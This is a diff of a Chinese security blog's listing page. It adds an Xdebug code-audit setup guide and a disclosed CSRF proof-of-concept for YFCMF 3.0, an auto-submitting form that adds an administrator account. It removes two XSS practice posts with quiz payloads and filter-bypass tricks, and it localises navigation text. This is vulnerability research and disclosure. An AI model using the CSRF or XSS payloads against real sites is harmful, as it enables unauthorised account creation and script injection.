@@ -90,6 +90,119 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2018/08/25/Phpstorm + phpstudy + Xdebug代码审计环境/"> 
+                    Phpstorm + phpstudy + Xdebug代码审计环境 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-08-25   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>硬着头皮挖了一些，也算是完成了之前一个月内出cve的任务：<br>1、YFCMF:<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16431" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16431</a><br>2、SQL in Bluecms1.6:<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16432" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16432</a><br>3、XSS in Semcms:<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16433" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16433</a><br>4、SQL in Semcms:<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16434" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16434</a></p>
+<p>但想学好代码审计还有很长的路要走，勿忘初心，开始正题~</p>
+<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><h3 id="安装php-xdebug-dll"><a href="#安装php-xdebug-dll" class="headerlink" title="安装php_xdebug.dll"></a>安装php_xdebug.dll</h3><p>phpstudy自带各版本的xdebug.dll插件</p>
+<p>在相应目录，如5.6.27版本下的在：phpStudy\PHPTutorial\php\php-5.6.27-nts\ext\php_xdebug.dll</p>
+<h3 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h3><p>php.ini在相应目录，如5.6.27版本下的在：\phpStudy\PHPTutorial\php\php-5.6.27-nts\php.ini</p>
+<p>在Xdebug部分加如下内容：</p>
+<pre><code>[XDebug]
+zend_extension=&quot;D:\phpStudy\PHPTutorial\php\php-5.6.27-nts\ext\php_xdebug.dll&quot;
+xdebug.profiler_append = 0
+xdebug.profiler_enable = 1
+xdebug.profiler_enable_trigger = 0
+xdebug.profiler_output_dir=&quot;D:\phpStudy\PHPTutorial\tmp\xdebug&quot;
+xdebug.trace_output_dir=&quot;D:\phpStudy\PHPTutorial\tmp\xdebug&quot;
+xdebug.profiler_output_name = &quot;cache.out.%t-%s&quot;
+xdebug.remote_enable = 1
+xdebug.remote_handler = &quot;dbgp&quot;
+xdebug.remote_host = &quot;127.0.0.1&quot;
+xdebug.remote_port = 9000
+xdebug.idekey = PHPSTORM</code></pre><p>zend_extension：插件地址<br>xdebug.remote_port = 9000 : Xdebug监听地址<br>xdebug.idekey = PHPSTORM： idekey名称（与后面设置对应）</p>
+<h3 id="设置php解释器"><a href="#设置php解释器" class="headerlink" title="设置php解释器"></a>设置php解释器</h3><p>![](Delete Link<br><a href="https://i.loli.net/2018/08/25/5b8157cb1f00f.png" target="_blank" rel="noopener">https://i.loli.net/2018/08/25/5b8157cb1f00f.png</a>)</p>
+<p>这里我用的是5.6.27版本的</p>
+<h3 id="设置xdebug参数"><a href="#设置xdebug参数" class="headerlink" title="设置xdebug参数"></a>设置xdebug参数</h3><p>Debug里设置监听地址：<br><img src="https://i.loli.net/2018/08/25/5b8157cb63338.jpg" alt></p>
+<p>接着设置代理：<br><img src="https://i.loli.net/2018/08/25/5b8157cb56aba.jpg" alt></p>
+<h3 id="配置Debug"><a href="#配置Debug" class="headerlink" title="配置Debug"></a>配置Debug</h3><p>运行–&gt;编辑配置</p>
+<p>Defaults–&gt;Web Page<br><img src="https://i.loli.net/2018/08/25/5b8157cb673a3.png" alt></p>
+<p>新增一个服务端，填写信息如图，要点击应用和确认<br><img src="https://i.loli.net/2018/08/25/5b8157cb55242.png" alt></p>
+<p>回到上级页面后别忘了选择刚才添加的server</p>
+<h3 id="浏览器安装debug插件"><a href="#浏览器安装debug插件" class="headerlink" title="浏览器安装debug插件"></a>浏览器安装debug插件</h3><p>下面我是使用火狐的插件xdebug-ext进行调试，因为审计用得比较多的就是火狐了插件多</p>
+<p>IDE key也要对应上我们的配置：<br><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpstorm6.png" alt></p>
+<h2 id="调试测试"><a href="#调试测试" class="headerlink" title="调试测试"></a>调试测试</h2><h3 id="新建一个工程"><a href="#新建一个工程" class="headerlink" title="新建一个工程"></a>新建一个工程</h3><h3 id="浏览器开启debug"><a href="#浏览器开启debug" class="headerlink" title="浏览器开启debug"></a>浏览器开启debug</h3><p>在需要debug的页面点击右上图标为红色时：<br><img src="https://i.loli.net/2018/08/25/5b8158615412d.jpg" alt></p>
+<h3 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h3><h3 id="phpstorm开启debug"><a href="#phpstorm开启debug" class="headerlink" title="phpstorm开启debug"></a>phpstorm开启debug</h3><p>点击右上角的小电话开启，再点左边的绿色甲壳虫图标进行调试</p>
+<p>传参后看结果<br><img src="https://i.loli.net/2018/08/25/5b81588414c88.png" alt></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/08/25/Phpstorm + phpstudy + Xdebug代码审计环境/">
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2018/08/23/Csrf in YFCMF 3.0/"> 
+                    Csrf in YFCMF 3.0 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-08-23   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>The background administrator adds CSRF to the page, causing other administrator accounts to add.</p>
+<h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><pre><code>&lt;html&gt;
+    &lt;form action=&quot;/YFCMF/admin/admin/adminsave.html&quot; method=&quot;post&quot;&gt;
+        &lt;select name=&quot;group_id&quot; required=&quot;&quot;&gt;
+            &lt;option value=&quot;2&quot;/&gt;
+        &lt;/select&gt;
+        &lt;input name=&quot;username&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt;
+        &lt;input name=&quot;password&quot; value=&quot;123&quot; type=&quot;hidden&quot;/&gt;
+        &lt;input name=&quot;email&quot; value=&quot;csrf@1.com&quot; type=&quot;hidden&quot;/&gt;
+        &lt;input name=&quot;realname&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+        document.forms[0].submit();
+    &lt;/script&gt;
+&lt;/html&gt;</code></pre><h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>1、View original users<br><img src="https://i.loli.net/2018/08/23/5b7e6aac7c4f4.png" alt></p>
+<p>2、Accessing structured CSRF pages<br><img src="https://i.loli.net/2018/08/23/5b7e6aac7ded1.png" alt></p>
+<p>3、Successfully added<br><img src="https://i.loli.net/2018/08/23/5b7e6aac970b0.png" alt><br><img src="https://i.loli.net/2018/08/23/5b7e6aacc099b.png" alt></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/08/23/Csrf in YFCMF 3.0/">
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2018/08/23/Arbitrary File upload in Semcms V2.7/"> 
                     Arbitrary File upload in Semcms V2.7 
                 </a>
@@ -126,7 +239,7 @@
             </div>
             <div class="continue">
             <a href="/2018/08/23/Arbitrary File upload in Semcms V2.7/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -382,7 +495,7 @@ if __name__ == &#39;__main__&#39;:
             </div>
             <div class="continue">
             <a href="/2018/08/21/Dedecms V5.7 SP2代码审计/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -534,7 +647,7 @@ if __name__ == &#39;__main__&#39;:
             </div>
             <div class="continue">
             <a href="/2018/08/18/代码审计复现：Bluecms 1.6/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -645,7 +758,7 @@ if __name__ == &#39;__main__&#39;:
             </div>
             <div class="continue">
             <a href="/2018/08/12/（转载） 基于 Token 的身份验证/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -752,7 +865,7 @@ if(empty($port)){
             </div>
             <div class="continue">
             <a href="/2018/08/10/初探ssrf/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -808,7 +921,7 @@ s.connect()</code></pre><p>2、 连接后发送数据和接收数据</p>
             </div>
             <div class="continue">
             <a href="/2018/08/08/Socket套接字编程学习/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -936,7 +1049,7 @@ if (!in_array($ext,$allowtype)){
             </div>
             <div class="continue">
             <a href="/2018/08/07/LFI with phpinfo测试/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -991,136 +1104,7 @@ if (!in_array($ext,$allowtype)){
             </div>
             <div class="continue">
             <a href="/2018/08/06/xss从零开始（三）之怒刷google-xss/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/08/02/xss从零开始（二）之怒刷xss-quiz/"> 
-                    xss从零开始（二）之怒刷xss-quiz 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-08-02   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="刷题"><a href="#刷题" class="headerlink" title="刷题"></a>刷题</h2><p>话不多说，刷题，平台：<a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">xss-quiz</a></p>
-<h2 id="chanllenge1"><a href="#chanllenge1" class="headerlink" title="chanllenge1"></a>chanllenge1</h2><p>直接丢payload</p>
-<pre><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre><p>document.domain 弹出当前网页的网址</p>
-<h2 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h2><p>随便查一个语句看一下浏览器是怎么渲染的<br><img src="https://s1.ax1x.com/2018/08/02/P02C5t.png" alt><br>查询的东西嵌在input标签里的value属性里，解析不到script标签不会调用Js，构造一下bypass逃逸input标签。</p>
-<pre><code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;value=&quot;12</code></pre><h2 id="challenge3-其它input框的xss"><a href="#challenge3-其它input框的xss" class="headerlink" title="challenge3 其它input框的xss"></a>challenge3 其它input框的xss</h2><p><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=1d3a326683f074388b7728dca060b78a14f0e9ec" target="_blank" rel="noopener">题目地址</a></p>
-<p>普通构造，右键源码发现把尖括号实体化编码了。<br><img src="https://s1.ax1x.com/2018/08/02/P02ebj.png" alt><br>用编码没绕过去，p2选择出存在xss无过滤，改一下参数为构造语句再提交<br><img src="https://s1.ax1x.com/2018/08/02/P02ZrQ.md.jpg" alt></p>
-<h2 id="challenge4-隐藏input框"><a href="#challenge4-隐藏input框" class="headerlink" title="challenge4 隐藏input框"></a>challenge4 隐藏input框</h2><p><a href="http://xss-quiz.int21h.jp/stage_4.php?sid=33be43b49a6aea5be5c026a7237d7b4f02c0ad5d" target="_blank" rel="noopener">题目地址</a></p>
-<p>隐藏有个p3输入框，type从hidden改为test，构造payload:</p>
-<pre><code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;value=&quot;</code></pre><h2 id="challenge5-长度限制"><a href="#challenge5-长度限制" class="headerlink" title="challenge5 长度限制"></a>challenge5 长度限制</h2><p><a href="http://xss-quiz.int21h.jp/stage--5.php?sid=d4eb6de1a6a0e9bd47b5926e4f8565b2050c5bf1" target="_blank" rel="noopener">题目地址</a></p>
-<p>长度限制改一下就行了</p>
-<pre><code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;value=&quot;</code></pre><h2 id="challenge6-on事件bypass尖括号"><a href="#challenge6-on事件bypass尖括号" class="headerlink" title="challenge6 on事件bypass尖括号"></a>challenge6 on事件bypass尖括号</h2><p><a href="http://xss-quiz.int21h.jp/stage-no6.php?sid=6509f715d2192b584b19d2b5e5bd1bc6717762fc" target="_blank" rel="noopener">题目地址</a></p>
-<p>过滤了尖括号，用其它事件绕过去，注意查看元素构造Payload:</p>
-<p>鼠标向上移动触发js事件：<code>&quot;onmouseover=&quot;alert(document.domain)&quot;</code>,onmouseover要脱离引号，alert在引号内。</p>
-<p>鼠标点击触发js事件：<code>&quot;onclick=&quot;alert(document.domain)&quot;</code></p>
-<p>事件会在页面或图像加载完成后立即发生:<code>onload=&quot;alert(document.domain)&quot;</code></p>
-<h2 id="challenge7-过滤尖括号和双引号和-amp"><a href="#challenge7-过滤尖括号和双引号和-amp" class="headerlink" title="challenge7 过滤尖括号和双引号和&amp;"></a>challenge7 过滤尖括号和双引号和&amp;</h2><p><a href="http://xss-quiz.int21h.jp/stage07.php?sid=15c647c2238f650c9f950d9639a4df17c21005b8" target="_blank" rel="noopener">题目地址</a></p>
-<p>经测试，输入空格会自动把前面补一个双引号，然后自己多构造一下找规律就行<br>bypass</p>
-<pre><code>a onclick=alert(document.domain)</code></pre><h2 id="challenge8-javascript伪协议"><a href="#challenge8-javascript伪协议" class="headerlink" title="challenge8 javascript伪协议"></a>challenge8 javascript伪协议</h2><p>从网上学习到：看到输出是在href属性下，用javascript伪协议</p>
-<p>常见用到伪协议的属性如下:</p>
-<pre><code>src
-href
-backgroud</code></pre><p>学了一波javascript伪协议，看到离歌师傅有一篇文章写的javascript伪协议与url编码联合bypass的文章，感叹还有这种姿势，但是这个道题应该用不到编码，但是我尝试了一下javascript伪协议确实会把“符号”变为“字符串”，从而使用编码，具体看师傅的文章：<br><a href="https://www.leavesongs.com/PENETRATION/use-location-xss-bypass.html" target="_blank" rel="noopener">利用location来变形我们的XSS Payload</a></p>
-<p>bypass:</p>
-<pre><code>javascript:alert(document.domain);</code></pre><p>等价的bypass</p>
-<pre><code>javascript:alert%28document.domain%29;</code></pre><h2 id="challenge9"><a href="#challenge9" class="headerlink" title="challenge9"></a>challenge9</h2><p>utf-7编码，看到网上说有问题，直接跳过</p>
-<h2 id="challenge10-过滤特定字符"><a href="#challenge10-过滤特定字符" class="headerlink" title="challenge10 过滤特定字符"></a>challenge10 过滤特定字符</h2><p><a href="http://xss-quiz.int21h.jp/stage00010.php?sid=6fa5bf6c0c7288222210ed0d77f851739e00f7e5" target="_blank" rel="noopener">题目地址</a></p>
-<p>过滤了domain，构造出来domain</p>
-<pre><code>&quot;&gt;&lt;script&gt;alert(document.domdomainain)&lt;/script&gt;&quot;&lt;value=&quot;</code></pre><h2 id="challenge11-编码绕过"><a href="#challenge11-编码绕过" class="headerlink" title="challenge11 编码绕过"></a>challenge11 编码绕过</h2><p>题目地址(<a href="http://xss-quiz.int21h.jp/stage11th.php?sid=ac29e65dc2666674f15adbe46a2c4af6397173ff" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage11th.php?sid=ac29e65dc2666674f15adbe46a2c4af6397173ff</a>)</p>
-<p>这题过滤很多：<br>1，script会被替换为xscript　</p>
-<p>2，on事件会被替换为onxxx</p>
-<p>3，style会被替换为stxxx</p>
-<p>想用html编码绕过构造script标签，结果如下：<br><img src="https://s1.ax1x.com/2018/08/03/PBNnnf.png" alt><br>后来测试发现，浏览器再解析xml时，先把标签解析成DOM树，而在标签名解析的时候不会解释html编码。解析成DOM树后，html编码解析只对<br>标签里面<strong>属性的值</strong>进行解码的。</p>
-<p>例如：</p>
-<pre><code>&lt;a text=&quot;scr&amp;#105;pt&quot;&gt;&lt;/a&gt;</code></pre><p>会被解析为：</p>
-<pre><code>&lt;a text=&quot;script&quot;&gt;&lt;/a&gt;</code></pre><p>但是脱离属性外的值不会被解码，例如：</p>
-<pre><code>&lt;a text=&quot;abc&quot; &quot;scr&amp;#105;pt&quot;&gt;&lt;/a&gt;</code></pre><p>还是会被解析成</p>
-<pre><code>&lt;a text=&quot;abc&quot; &quot;scr&amp;#105;pt&quot;&gt;&lt;/a&gt;</code></pre><p>所以我们构造script标签的思路行不通，那我们可以用html编码构造事件，但是构造事件又会脱离“属性”这个范围，编码不会被解析。那我们就重新构造标签，利用href属性和Javascript伪协议<br>bypass</p>
-<pre><code>&quot;&gt;&lt;a href=javascr&amp;#105;pt:alert(document.domain)&gt;xss&lt;/a&gt;</code></pre><h2 id="challenge12"><a href="#challenge12" class="headerlink" title="challenge12"></a>challenge12</h2><p>过滤了&lt;&gt;和双引号，绕不过去双引号闭合，我们用html编码构造的双引号会被认为成“字符串型”的引号，而不是“符号”，所以不能逃逸出来，看到网上wp说用`可以代替引号，前提是IE8浏览器才能这么解释，这里没什么实战意义，就不做了</p>
-<h2 id="challenge15-document-write"><a href="#challenge15-document-write" class="headerlink" title="challenge15 document.write()"></a>challenge15 document.write()</h2><p><a href="http://xss-quiz.int21h.jp/stage__15.php?sid=0e9fcc768b680fc1b76007d10e36ea7d68d79dfd" target="_blank" rel="noopener">题目地址</a></p>
-<p>这题过滤了尖括号，双引号，但在input标签之上引用了document.write的方法，那么什么是document.write方法呢？</p>
-<p>w3c里是这样定义的：<br>write() 方法可向文档写入 HTML 表达式或 JavaScript 代码。<br>可列出多个参数(exp1,exp2,exp3,…) ，它们将按顺序被追加到文档中。</p>
-<p>也就是说我们在write一下插入的代码就是js范畴了，\u + Unicode编码这种形式是js的编码方法，所以会被解释为&lt;，但是document.write在输出的时候会JavascriptDecode一下数据，会把数据原有\去除，即php里面的stripslashes。</p>
-<p>因此我们要用\来替代\，payload:</p>
-<pre><code>\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
-\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</code></pre><p>一种是unicode编码，一种是\x + 16进制，都可以绕过</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>剩下的题目有些环境严苛不做研究。总结一下，能调用js的方式：一些on事件，如:onmouseover、onclick、onerror等等。或者script标签，如果是标签的话，要脱离其它标签才能开启js解析调用。还有就是一些特定的方法，现在接触到的只有一个document.write。</p>
-<p>学会构造、学会用javascript伪协议，学会编码绕过，知道浏览器解析的顺序，that’s important~</p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/08/02/xss从零开始（二）之怒刷xss-quiz/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/08/01/xss从零开始（一）/"> 
-                    xss从零开始（一） 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-08-01   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这两天事情比较多，学习了一下scrapy只能简单的爬一下没有登陆模拟的页面，以后再写登陆模拟的接口。一直说要学xss却没怎么起步，就是做过几个题粗略的了解。准备系统的学习xss和html内的构造、CSS的渲染。找到一些大神的学习手册，跟着学习一下</p>
-<h2 id="一个简单的demo"><a href="#一个简单的demo" class="headerlink" title="一个简单的demo"></a>一个简单的demo</h2><p>输出所输入的内容<br><img src="https://s1.ax1x.com/2018/08/01/Pw4niR.png" alt></p>
-<p>demo代码<br><img src="https://s1.ax1x.com/2018/08/01/Pw4uJ1.png" alt></p>
-<h2 id="Html知识补充"><a href="#Html知识补充" class="headerlink" title="Html知识补充"></a>Html知识补充</h2><h3 id="id属性"><a href="#id属性" class="headerlink" title="id属性"></a>id属性</h3><p>id只能唯一，识别作用</p>
-<h3 id="class属性"><a href="#class属性" class="headerlink" title="class属性"></a>class属性</h3><p>定义的类可以多次引用</p>
-<h3 id="div标签"><a href="#div标签" class="headerlink" title="div标签"></a>div标签</h3><div> 可定义文档中的分区或节（division/section）。
-<div> 标签可以把文档分割为独立的、不同的部分。它可以用作严格的组织工具，并且不使用任何格式与其关联。如果用 id 或 class 来标记 <div>，那么该标签的作用会变得更加有效。
-
-<p>div就是一块区域的标签，可以对同一个 <div> 元素应用 class 或 id 属性，但是更常见的情况是只应用其中一种。这两者的主要差异是，class 用于元素组（类似的元素，或者可以理解为某一类元素），而 id 用于标识单独的特定的元素。不必为每一个 <div> 都加上类或 id。</div></div></p>
-<h3 id="span标签"><a href="#span标签" class="headerlink" title="span标签"></a>span标签</h3><p>自己定义名称的标签，你也可以命名为a标签或者hpdoger标签，标记好id就行</p>
-<h3 id="Input标签"><a href="#Input标签" class="headerlink" title="Input标签"></a>Input标签</h3><p>输入标签，定义class可以选择demo，type规定输入类型，记得标记id</p>
-<h3 id="button标签"><a href="#button标签" class="headerlink" title="button标签"></a>button标签</h3><p>字如其名，按钮作用</p>
-<h3 id="document-querySelector"><a href="#document-querySelector" class="headerlink" title="document.querySelector"></a>document.querySelector</h3><p>获取文档中 id=”demo” 的元素：</p>
-<pre><code>document.querySelector(&quot;#demo&quot;);</code></pre><h3 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h3><p>innerHTML 属性设置或返回表格行的开始和结束标签之间的 HTML。</p>
-<p>这里就是在span标签之间插入value</p>
-<h2 id="xss测试"><a href="#xss测试" class="headerlink" title="xss测试"></a>xss测试</h2><p>我们插一个Script看是否会弹框<br><img src="https://s1.ax1x.com/2018/08/01/Pw4KRx.png" alt></p>
-<p>没有弹框，看一下script的位置，原因如下：</p>
-<p><strong>w3c规范innerHTML这个api插入的script标签不会被执行</strong></p>
-</div></div></div>
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/08/01/xss从零开始（一）/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1128,7 +1112,7 @@ backgroud</code></pre><p>学了一波javascript伪协议，看到离歌师傅有
 </section>
 
   <nav class="page-nav">
-    <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/3/">&laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/">下一页 &raquo;</a>
   </nav>
 
     </main>
